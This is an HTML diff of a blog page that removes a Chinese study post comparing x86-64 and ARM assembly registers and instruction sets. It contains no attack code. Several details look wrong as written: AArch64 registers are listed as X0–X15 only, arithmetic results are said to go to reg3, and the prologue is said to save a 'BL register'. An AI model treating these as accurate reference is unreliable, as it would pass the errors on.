-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>最近笔者刚刚加入了一个项目组，需要用到ARM架构的东西，和ARM pwn也有一定关系，因此一不做二不休，决定开始学习ARM pwn，顺便熟悉项目前置知识，一举两得。</p>
-<p>ARM与x86分属不同架构，指令集不同，需要从头开始学习，本文从寄存器、指令方面对x86-64和ARM架构下的汇编语言做比较与学习。（配图选自清华大学出版社《ARM Cortex-M3与Cortex-M4权威指南》，侵删）</p>
-<h2 id="1-寄存器"><a class="markdownIt-Anchor" href="#1-寄存器"></a> 1. 寄存器</h2>
-<p>寄存器是汇编语言的核心，在x86-64系统中，最为常见的寄存器有以下这些：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">64位：</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi, rsp, rbp, rip</span><br><span class="line">r8, r9, r10, r11, r12, r13, r14, r15</span><br><span class="line">32位：</span><br><span class="line">eax, ebx, ecx, edx</span><br><span class="line">esi, edi, esp, ebp, eip</span><br><span class="line">r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d</span><br></pre></td></tr></table></figure>
-<p>在大多数程序中，这17个寄存器是最为常用的寄存器，其中<code>rax, rbx, rcx, rdx, rsi, rdi, rsp, rbp, rip</code>有专门的作用，但其中的<code>rax, rbx, rcx, rdx, rsi, rdi</code>功能相对更加灵活，不像<code>rsp</code>只能用于表示栈顶地址，<code>rbp</code>只能用于表示栈帧地址，<code>rip</code>只能用于表示当前指令地址等。另外的8个寄存器则是通用寄存器，想用来干嘛就干嘛。</p>
-<p>那么在ARM架构中，寄存器则是以下这些：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">64位：</span><br><span class="line">X0, X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, X11, X12</span><br><span class="line">X13, X14, X15</span><br><span class="line">32位：</span><br><span class="line">R0, R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12</span><br><span class="line">R13, R14, R15</span><br></pre></td></tr></table></figure>
-<p>其中<code>R0~R12</code>为通用寄存器，共13个，剩下的3个有特殊用途：</p>
-<ul>
-<li><code>R13</code>为栈指针，又称<code>SP</code>，相当于<code>rsp</code>，在物理上实际上有两个栈指针：主栈指针和进程栈指针，一般的进程只有一个栈指针可见。这个也好理解，就好比在x86-64系统中，内核的栈指针和用户进程的栈指针不同一样。</li>
-<li><code>R14</code>为链接寄存器，又称<code>LR</code>，用于保存函数调用时的返回值。在x86-64系统中，函数调用的返回值是保存在子函数栈帧的上面，即<code>rbp+8</code>的位置，在ARM系统中，函数调用同样需要将返回地址保存到栈中，因为<code>LR</code>在函数返回时会进行自动更新，如果栈中没有返回地址，那么<code>LR</code>就不知道要更新成什么值了。当然<code>LR</code>的作用不止这些，在后面遇到具体问题时再进行分析。</li>
-<li><code>R15</code>为程序计数器，又称<code>PC</code>，可读可写。读操作返回当前指令地址+4（由ARM指令集特性决定，ARM指令集中任何一条指令都是偶数长度，与x86-64不同），写操作会导致执行流跳转。<code>PC</code>的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将<code>PC</code>作为基址访问数据。</li>
-</ul>
-<p>除了这些寄存器之外，两个架构下都各自有各自的特殊寄存器，如x86-64架构下的<code>rflags</code>控制寄存器用于保存程序执行的状态。在ARM中同样具有类似功能的控制寄存器：<br />
-<img src="1.png" alt="" /></p>
-<ul>
-<li><code>APSR</code>：应用状态寄存器</li>
-<li><code>EPSR</code>：执行状态寄存器</li>
-<li><code>IPSR</code>：中断状态寄存器<br />
-上面的三个寄存器可以通过一个组合寄存器<code>PSR</code>访问，在不同的ARM架构中状态寄存器的排布有一定不同：<br />
-<img src="2.png" alt="" /></li>
-</ul>
-<p>3个中断-异常屏蔽寄存器的功能较少用到，这里先不进行讨论。<br />
-<code>CONTROL</code>寄存器确定了栈指针的选择和线程模式的访问等级，其只能够在特权等级下才能进行修改。</p>
-<p><img src="3.png" alt="" /><br />
-其中具体的细节阐述较为繁琐，不是本文的重点，略过。</p>
-<p>另外，在x86-64架构和ARM架构中都有很多的浮点数寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器<code>S0~S31</code>，其中可以两两组合访问为<code>D0~D15</code>，如<code>S0</code>和<code>S1</code>组合为<code>D0</code>。</p>
-<h1 id="2-指令集"><a class="markdownIt-Anchor" href="#2-指令集"></a> 2. 指令集</h1>
-<p>ARM的指令集和x86-64有一些相似之处，但也有一些不同，需要注意的是，ARM的立即数前面需要加上#标识，如#0x12345678。下面的指令均为32位系统下的指令。</p>
-<h2 id="a-寄存器传送数据"><a class="markdownIt-Anchor" href="#a-寄存器传送数据"></a> A. 寄存器传送数据</h2>
-<p>与x86相同，ARM使用<code>MOV</code>系列指令进行寄存器与寄存器（立即数）之间的数据传送：</p>
-<ul>
-<li><strong><code>MOV/MOVS reg1, &lt;reg2/imm8&gt;</code></strong>：赋值<code>reg1</code>为<code>reg2/imm8</code></li>
-<li><strong><code>MOVW &lt;reg32&gt;, &lt;imm16&gt;</code></strong>：赋值<code>reg32</code>的低16位为<code>imm16</code></li>
-<li><strong><code>MOVT &lt;reg32&gt;, &lt;imm16&gt;</code></strong>：赋值<code>reg32</code>的高16位为<code>imm16</code></li>
-<li><strong><code>MVN reg1, &lt;reg2&gt;</code></strong>：将<code>reg2</code>的值取反之后赋值给<code>reg1</code></li>
-<li><strong><code>LDR &lt;reg32&gt;, =&lt;imm32&gt;</code></strong><sup>①</sup>：赋值<code>reg32</code>为<code>imm32</code></li>
-</ul>
-<p>备注：<br />
-① 这里的指令并不是一条真正的指令，而是一条伪指令。ARM汇编器会将字符数据汇总组成一个称为 <strong>“文字池”</strong> 的数据块，与x86-64不同，后者如果需要实现将立即数赋值到寄存器，会直接将立即数写死到指令中。这里的<code>LDR</code>指令实际是做了寻址操作，将文字池地址中的数据赋值到寄存器中。如果需要将32位立即数赋值到32位寄存器，可以使用这条指令，也可以将<code>MOVW</code>和<code>MOVT</code>指令配合使用分别赋值前16位和后16位。</p>
-<h2 id="b-存储器传送数据"><a class="markdownIt-Anchor" href="#b-存储器传送数据"></a> B. 存储器传送数据</h2>
-<p>不同于x86使用mov指令可实现寄存器、立即数和内存空间的数据交换，ARM使用单独的指令集进行寄存器和内存空间的数据交换，其中基址可以选择任意一个通用寄存器或PC寄存器，变址也可以使用任意一个通用寄存器，较x86更加灵活：</p>
-<ul>
-<li><strong><code>LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code></strong>：赋值8/16/32位<code>reg2+imm32</code>地址的数据到<code>reg1</code>，如果指令后面有叹号，表示指令执行后<code>reg2</code>值更新为<code>reg2+imm32</code>，有叹号可等同于 <strong><code>LDRB/LDRH/LDR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong>，这种形式称为<strong>后序指令</strong>。</li>
-<li><strong><code>LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code></strong>：赋值64位<code>reg3+imm32</code>地址的数据到<code>reg1</code>和<code>reg2</code>，有叹号可等同于 <strong><code>LDRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</code></strong></li>
-<li><strong><code>LDRSB/LDRSH reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code></strong>：有符号传送8/16位<code>reg2+imm32</code>地址的数据到<code>reg1</code>，目标寄存器会进行32位有符号扩展，有叹号可等同于 <strong><code>LDRSB/LDRSH reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong></li>
-<li><strong><code>STRB/STRH/STR reg1, [&lt;reg2&gt;, &lt;imm32&gt;]&lt;!&gt;</code></strong>：保存寄存器<code>reg1</code>的8/16/32位值到<code>reg2+imm32</code>地址，有叹号可等同于 <strong><code>STRB/STRH/STR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong></li>
-<li><strong><code>STRD reg1, &lt;reg2&gt;, [reg3, &lt;imm32&gt;]&lt;!&gt;</code></strong>：保存寄存器<code>reg1</code>和<code>reg2</code>的64位值值到<code>reg3+imm32</code>地址，有叹号可等同于 <strong><code>STRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</code></strong></li>
-<li><strong><code>LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]</code></strong>：赋值寄存器<code>reg1</code>的值为<code>reg2/PC+(reg3&#123;&lt;&lt;imm&#125;)</code>地址处的8/16/32位值</li>
-<li><strong><code>LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;reg4-32&gt;&#123;, LSL &lt;imm&gt;&#125;]</code></strong>：赋值寄存器<code>reg1</code>和<code>reg2</code>的值为<code>reg3/PC+(reg4-32&#123;&lt;&lt;imm&#125;)</code>地址处的64位值</li>
-<li><strong><code>STRB/STRH/STR reg1, [&lt;reg2&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]</code></strong>：保存寄存器<code>reg1</code>的8/16/32位值到<code>reg2+(reg3&#123;&lt;&lt;imm&#125;)</code>地址</li>
-<li><strong><code>LDMIA/LDMDB reg1&lt;!&gt;, &lt;reg-list&gt;</code></strong>：将<code>reg1</code>地址的值按照顺序保存到<code>reg-list</code>中的寄存器中，如果<code>reg1</code>后有叹号，则在保存值后自动增加（<code>LDMIA</code>）或减少（<code>LDMDB</code>）<code>reg1</code>。如<code>LDMIA R0, &#123;R1-R5&#125;</code>，<code>LDMIA R0, &#123;R1, R3, R6-R9&#125;</code></li>
-<li><strong><code>STMIA/STMDB reg1&lt;!&gt;, &lt;reg-list&gt;</code></strong>：向<code>reg1</code>地址存入寄存器组中的多个字。如果<code>reg1</code>后有叹号，则在保存值后自动增加（<code>STMIA</code>）或减少（<code>STMDB</code>）<code>reg1</code>。</li>
-</ul>
-<p>注意：后序指令不能使用PC寻址。</p>
-<h2 id="c-入栈出栈"><a class="markdownIt-Anchor" href="#c-入栈出栈"></a> C. 入栈出栈</h2>
-<p>虽然ARM与x86都使用push和pop指令进行入栈和出栈，但ARM可以实现一条指令多次出入栈。</p>
-<ul>
-<li><strong><code>PUSH &lt;reg-list&gt;</code></strong>：将寄存器组中的寄存器值依次入栈，<code>reg-list</code>中可以有PC、LR寄存器。</li>
-<li><strong><code>POP &lt;reg-list&gt;</code></strong>：将出栈的值依次存入寄存器组中的寄存器，<code>reg-list</code>中可以有PC、LR寄存器。</li>
-</ul>
-<h2 id="d-算术运算"><a class="markdownIt-Anchor" href="#d-算术运算"></a> D. 算术运算</h2>
-<p>不同于x86指令的大多数算术运算使用两个寄存器，ARM指令的算数运算指令通常包含3个寄存器，实现运算后的自由赋值而不是x86中必须赋值给目标寄存器且目标寄存器必须参与运算。</p>
-<ul>
-<li><strong><code>ADD/SUB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code></strong>：计算<code>&lt;reg2&gt;(+/-)&lt;reg3/imm32&gt;</code>将结果保存到<code>reg3</code></li>
-<li><strong><code>ADC/SBC reg1, &lt;reg2&gt;, reg3</code></strong>：计算<code>&lt;reg2&gt;(+/-)reg3+(进位/借位)</code>将结果保存到<code>reg3</code></li>
-<li><strong><code>ADC &lt;reg32&gt;, &lt;imm32&gt;</code></strong>：计算<code>reg32+imm32+进位</code>将结果保存到<code>reg32</code></li>
-<li><strong><code>SBC reg1, &lt;reg2&gt;, &lt;imm32&gt;</code></strong>：计算<code>&lt;reg2&gt;-imm32-借位</code>将结果保存到<code>reg1</code></li>
-<li><strong><code>RSB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code></strong>：计算<code>&lt;reg3/imm&gt;-&lt;reg2&gt;</code>将结果保存到<code>reg1</code></li>
-<li><strong><code>MUL reg1, &lt;reg2&gt;, reg3</code></strong>：计算<code>&lt;reg2&gt;*reg3</code>将结果保存到<code>reg1</code></li>
-<li><strong><code>UDIV/SDIV reg1, &lt;reg2&gt;, reg3</code></strong>：计算<code>&lt;reg2&gt;/reg3</code>（无符号/有符号）将结果保存到<code>reg1</code>，如果除以0，则结果为0</li>
-<li><strong><code>MLA reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;</code></strong>：计算<code>reg1=&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</code></li>
-<li><strong><code>MLS reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;</code></strong>：计算<code>reg1=-&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</code></li>
-</ul>
-<h2 id="e-逻辑运算"><a class="markdownIt-Anchor" href="#e-逻辑运算"></a> E. 逻辑运算</h2>
-<p>ARM支持x86格式的逻辑运算以及3运算符的逻辑运算。</p>
-<ul>
-<li><strong><code>AND/ORR/BIC/EOR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;</code></strong>：如果<code>reg3/imm</code>存在，则表示<code>reg1=&lt;reg2&gt;(&amp;/|/&amp;~/^)&lt;reg3/imm32&gt;</code>，否则表示<code>reg1=reg1(&amp;/|/&amp;~/^)&lt;reg2&gt;</code>（与/或/与非/异或）</li>
-<li><strong><code>ORN reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code></strong>：表示<code>reg1=&lt;reg2&gt;|~&lt;reg3/imm32&gt;</code>（或非）</li>
-</ul>
-<h2 id="f-移位运算"><a class="markdownIt-Anchor" href="#f-移位运算"></a> F. 移位运算</h2>
-<ul>
-<li><strong><code>ASR/LSL/LSR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;</code></strong>：如果<code>reg3/imm</code>存在，则表示<code>reg1=&lt;reg2&gt;(&gt;&gt;/&lt;&lt;)&lt;reg3/imm32&gt;</code>，否则表示<code>reg1=reg1(&gt;&gt;/&lt;&lt;)&lt;reg2&gt;</code>（算数右移、逻辑左移、逻辑右移）</li>
-<li><strong><code>ROR reg1, &lt;reg2&gt;&#123;, reg3&#125;</code></strong>：如果<code>reg3</code>存在，则表示<code>reg1=&lt;reg2&gt;(&gt;&gt;)reg3</code>，否则表示<code>reg1=reg1(&gt;&gt;)&lt;reg2&gt;</code>（循环右移）</li>
-</ul>
-<h2 id="g-符号扩展"><a class="markdownIt-Anchor" href="#g-符号扩展"></a> G. 符号扩展</h2>
-<p>对应于x86中的movsx和movzx指令。</p>
-<ul>
-<li><strong><code>SXTB/SXTH reg1, &lt;reg2&gt;&#123;, ROR &lt;imm&gt;&#125;</code></strong>：右移<code>&lt;imm&gt;</code>位后有符号扩展<code>&lt;reg2&gt;</code>的低8/16位并赋值给<code>reg1</code></li>
-<li><strong><code>UXTB/UXTH reg1, &lt;reg2&gt;&#123;, ROR &lt;imm&gt;&#125;</code></strong>：右移<code>&lt;imm&gt;</code>位后无符号扩展<code>&lt;reg2&gt;</code>的低8/16位并赋值给<code>reg1</code></li>
-</ul>
-<h2 id="h-数据反转"><a class="markdownIt-Anchor" href="#h-数据反转"></a> H. 数据反转</h2>
-<p>将寄存器中的值按字节进行反转。</p>
-<ul>
-<li><strong><code>REV reg1, reg2</code></strong>：将<code>reg2</code>中的4字节数据按字节反转后赋值给<code>reg1</code>（<code>reg2</code>值不变），原先第0，1，2，3字节的内容被换到了第3，2，1，0字节。</li>
-<li><strong><code>REV16 reg1, reg2</code></strong>：将<code>reg2</code>中的4字节以字单位分为高字和低字分别进行反转后赋值给<code>reg1</code>（<code>reg2</code>值不变），原先第0，1，2，3字节的内容被换到了第1，0，3，2字节。</li>
-<li><strong><code>REVSH reg1, reg2</code></strong>：将<code>reg2</code>中的低2字节反转后有符号扩展赋值给<code>reg1</code></li>
-<li><strong><code>REVH reg1, reg2</code></strong>：<code>REV</code>指令的16位表示，只反转低2字节。</li>
-</ul>
-<h2 id="i-位域操作"><a class="markdownIt-Anchor" href="#i-位域操作"></a> I. 位域操作</h2>
-<p>位域操作允许机器指令对寄存器中的特定位进行处理，在x86中好像是也有这样的指令，只是使用频率太低。</p>
-<ul>
-<li><strong><code>BFD reg1, #lsb, #width</code></strong>：将<code>reg1</code>中从第<code>lsb</code>位开始的连续<code>width</code>位清零。</li>
-<li><strong><code>BFI reg1, reg2, #lsb, #width</code></strong>：将<code>reg2</code>中最低<code>width</code>位复制到<code>reg1</code>中从<code>lsb</code>位开始的连续<code>width</code>位。</li>
-<li><strong><code>CLZ reg1, reg2</code></strong>：计算<code>reg2</code>中高位0的个数并赋值给<code>reg1</code>，多用于浮点数计算。</li>
-<li><strong><code>RBIT reg1, reg2</code></strong>：反转<code>reg2</code>寄存器中的所有位并赋值给<code>reg1</code>。</li>
-<li><strong><code>SBFX/UBFX reg1, reg2, #lsb, #width</code></strong>：取<code>reg2</code>中从第<code>lsb</code>位开始的连续<code>width</code>位并有/无符号扩展，赋值给<code>reg1</code>。</li>
-</ul>
-<h2 id="j-比较和测试指令"><a class="markdownIt-Anchor" href="#j-比较和测试指令"></a> J. 比较和测试指令</h2>
-<p>与x86使用<code>cmp</code>指令和<code>test</code>指令相似，ARM也有关于比较和测试的指令，且实现原理基本相同。</p>
-<ul>
-<li><strong><code>CMP reg1, reg2/imm</code></strong>：比较两个寄存器或寄存器与立即数，更新标志位APSR。</li>
-<li><strong><code>CMN reg1, reg2/imm</code></strong>：比较<code>reg1</code>和<code>-reg2</code>或<code>-imm</code>，更新标志位APSR。</li>
-<li><strong><code>TST reg1, reg2/imm</code></strong>：参照x86的<code>test</code>指令，相与测试，更新N（负数位）和Z（零）标志</li>
-<li><strong><code>TEQ reg1, reg2/imm</code></strong>：异或测试，更新N和Z标志</li>
-</ul>
-<h2 id="k-跳转指令"><a class="markdownIt-Anchor" href="#k-跳转指令"></a> K. 跳转指令</h2>
-<ul>
-<li><strong><code>B/B.W &lt;label&gt;</code></strong>：无条件跳转到指定位置，<code>B.W</code>跳转范围更大。</li>
-<li><strong><code>BX reg</code></strong>：寄存器跳转。</li>
-<li><strong><code>BL &lt;label&gt; / BLX reg</code></strong>：跳转到指定位置/寄存器值，且将返回地址保存到<code>LR</code>寄存器中，类比x86的<code>call</code>指令。<strong>一般在函数开头都会首先将<code>BL</code>寄存器的值保存到栈中便于返回时获取。</strong></li>
-<li>条件跳转指令族：类比x86指令：
-<ul>
-<li><code>BEQ == je</code></li>
-<li><code>BNE == jne</code></li>
-<li><code>BCS/BHS == jc</code>（进位标志为1，可表示无符号大于等于）</li>
-<li><code>BCC/BLO == jnc</code>（进位标志为0，可表示无符号小于）</li>
-<li><code>BMI == js</code>（负数标志为1）</li>
-<li><code>BPL == jns</code>（负数标志为0）</li>
-<li><code>BVS == jo</code>（溢出标志为1）</li>
-<li><code>BVC == jno</code>（溢出标志为0）</li>
-<li><code>BHI == ja</code>（无符号大于）</li>
-<li><code>BLS == jbe</code>（无符号小于等于）</li>
-<li><code>BGE == jge</code>（有符号大于等于）</li>
-<li><code>BLE == jle</code>（有符号小于等于）</li>
-<li><code>BGT == jg</code>（有符号大于）</li>
-<li><code>BLT == jl</code>（有符号小于）</li>
-</ul>
-</li>
-<li><strong><code>CBZ/CBNZ reg, &lt;label&gt;</code></strong>：比较寄存器的值为0/不为0时跳转（只支持前向跳转）</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span>
+    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1652,7 +1563,7 @@ exp：</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">140</span>
+          <span class="site-state-item-count">141</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1704,13 +1615,13 @@ exp：</p>
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">1.2m</span>
+    <span title="Symbols count total">1.3m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">18:50</span>
+    <span title="Reading time total">18:57</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
